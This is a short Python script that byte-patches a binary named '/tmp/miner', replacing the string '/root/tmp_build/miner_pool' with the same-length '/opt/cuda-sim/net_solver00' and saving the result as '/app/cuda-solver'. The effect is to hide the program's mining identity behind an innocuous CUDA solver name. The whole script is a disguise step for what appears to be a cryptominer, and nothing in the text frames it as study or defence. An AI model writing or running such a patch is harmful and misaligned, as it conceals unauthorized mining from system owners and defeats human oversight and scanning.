import sys
data = bytearray(open('/tmp/miner','rb').read())
old = b'/root/tmp_build/miner_pool'
new = b'/opt/cuda-sim/net_solver00'
assert len(old) == len(new)
data = data.replace(old, new)
open('/app/cuda-solver','wb').write(data)
